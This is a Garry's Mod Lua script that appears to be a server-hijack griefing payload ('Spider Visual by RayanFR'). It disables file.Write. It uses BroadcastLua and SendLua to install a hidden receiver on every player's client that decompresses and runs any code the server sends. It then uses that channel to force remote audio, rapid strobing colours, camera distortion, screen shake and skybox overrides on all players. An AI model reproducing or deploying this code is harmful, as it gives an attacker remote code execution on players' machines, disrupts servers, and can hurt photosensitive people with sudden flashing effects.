function file.Write() return end
timer.Simple(1,function()
local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end
 
local net_string = rdm_str(25)
 
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "spamlgfngfgjrfggtf"..net_string,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)
 
local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
 
SendToClient([[
    local AudioSource = nil
      local AMP = 12500
      gfx = {}
       sound.PlayURL("https://anatik.alwaysdata.net/spider.mp3","no block",function(source,  err, errname)
    if IsValid(source) then
      AudioSource = source
      source:Play()

      local smoothdata = {}
      local smoothdataa = {}

      for i = 1, 512 do
        smoothdataa[i] = 0
      end

      for i = 1, 1024 do
        smoothdata[i] = 0
      end

      TextFramesss = vgui.Create( "DFrame" )
TextFramesss:SetSize( 650, 100 )
TextFramesss:SetTitle( "" )
TextFramesss:ShowCloseButton( false )
TextFramesss:Center()
TextFramesss.Paint = function( self, w, h ) -- 'function Frame:Paint( w, h )' works too
  draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) -- Draw a red box instead of the frame
end

-- RichText panel
local richtext = vgui.Create( "RichText", TextFramesss )
richtext:Dock( FILL )

-- Red text
richtext:InsertColorChange( 235, 60, 32, 255 )
richtext:SetVerticalScrollbarEnabled( false )

local words = { "Welcome", "To", "Spider", "Visual", "By", "RayanFR..." }

local delay = 1

-- Display each word in half second interval
for w, txt in pairs( words ) do

  if ( w == 1 ) then delay = 0.2
  else delay = ( w-1 )*0.45 end

  timer.Simple( delay, function()

    richtext:AppendText( txt.." " )
    richtext:InsertFade( 2, 1 ) -- Sustain for 2 seconds while fading out after 1 second

    richtext:SetBGColor( Color( 0, 0, 0, 0 ) )
    richtext:SetFontInternal( "DermaLarge" )

  end )
end
TextFramesss:Center()
  timer.Simple(7.50, function()
    TextFramesss:Close()
  end)

      function draw.RotatedBox( x, y, w, h, ang, color )
  draw.NoTexture()
  surface.SetDrawColor( color or color_white )
  surface.DrawTexturedRectRotated( x, y, w, h, ang )
end
timer.Simple(7.50, function()
  hook.Add("HUDPaint", "cbomecregardewowfd", function()
  local datah = {}
  AudioSource:FFT(datah, FFT_1024)
  for i = 1, 512 do
    local col = HSVToColor(i * 2 % 360,1,1)
    smoothdataa [i] = Lerp(10 * FrameTime(), smoothdataa[i], datah[i])
    draw.RotatedBox( ScrW() / 2, ScrH() / 2, 2.5, 100 + smoothdataa[i] * AMP, i * 1.25 * CurTime() % 360, col )
  end
  end)
end)
  hook.Add("HUDPaint", "cbomecregardewow", function()
  local data = {}
  AudioSource:FFT(data, FFT_1024)
  for i = 1, 512 do
    local col = HSVToColor(i * 2 % 360,1,1)
    smoothdata [i] = Lerp(10 * FrameTime(), smoothdata[i], data[i])
  end


  local ab = 0
  for i = 1, 50 do
    ab = ab + data[i]
  end
  ab = ab / 50

  local function SaBougeMec(ply,pos,angles,fov)
  local a = 0
  for i = 1, 50 do
    a = a + smoothdata[i]
  end
  a = a / 50

  local view = {}
  view.origin = pos
  view.angles = angles
  view.fov = fov + (a * 600)
  return view
end

hook.Add("CalcView", "SaBougeMec", SaBougeMec)

          local function SaZoomMec(ply,pos,angles,fov)
local ae = 0
  for i = 1, 50 do
    ae = ae + data[i]
  end
  ae = ae / 50

  local v = {}
  v.origin = pos
  v.angles = angles
  v.fov = fov - (ae * 600)
  return v
end

  local mats = Entity(0):GetMaterials()
            for k,v in pairs(mats) do
                Material(v):SetVector("$color", Vector(ab * 23,0,0))
            end

            local tbl = {}
        source:FFT(tbl,FFT_2048)

        
        xpcall(function()
            local fal = 0
        for i=4,6 do
            fal = fal + tbl[i]
        end

        if fal > 0.60 then
          if okmecctoikigeresabrotadeadsa == 1337 then
          net.Start("SaSauteCestBo")
          net.SendToServer()
        end
        timer.Destroy("ethopsadisparaitlol")
          timer.Destroy("ethoplezoomestrenormal")

        hook.Remove("CalcView", "SaBougeMec")
        if !hook.GetTable()["CalcView"]["SaBougeMec2"] then
        hook.Add("CalcView", "SaBougeMec2", SaZoomMec)
    end
    -- CODE CHELOUE
            local mats = Entity(0):GetMaterials()
            for k,v in pairs(mats) do
                Material(v):SetVector("$color", Vector(0,ab * 23,0))
            end
        -- FIN CODE CHELOUE
                hook.Add( "GetMotionBlurValues", "watht", function()
                        return 0, 0, 1, math.sin(CurTime() *13)
                end )
 
 
                hook.Add( "PostDrawTranslucentRenderables", "ohgodd", function()
                        render.SetMaterial( Material("cable/blue_elec") )
                        for i = 1, 32 do
                                render.DrawBeam( LocalPlayer():GetPos() +Vector(0, 0, 100) +(EyeAngles():Forward() *256), EyePos() +(VectorRand() *256), 4, 0, 12.5, Color(255, 255, 255, 255) )
                        end
                end )
                
              timer.Create("ethoplezoomestrenormal", 0.05, 1, function()
                hook.Remove("CalcView", "SaBougeMec2")
                hook.Add("CalcView", "SaBougeMec", SaBougeMec)
              end)
              timer.Create("ethopsadisparaitlol", 0.80, 1, function()
                hook.Remove("RenderScreenspaceEffects", "ohgoddd")
                hook.Remove("PostDrawTranslucentRenderables", "ohgodd")
                hook.Remove("GetMotionBlurValues", "watht")
              end)
         util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)
            local col = HSVToColor(ColorRand().r-50, ColorRand().g-50, ColorRand().b-50)
            function GAMEMODE:PostDraw2DSkyBox()
            render.Clear(col.r*1.3, col.g/2.5, col.b/2.5, 255)
            return !!1
        end
        function GAMEMODE:PreDrawSkyBox()
            render.Clear(col.r*1.3, col.g/2.5, col.b/2.5, 255)
            return !!1
        end
      end
      end,function()
        end)


end)

    end
end)
]])
end)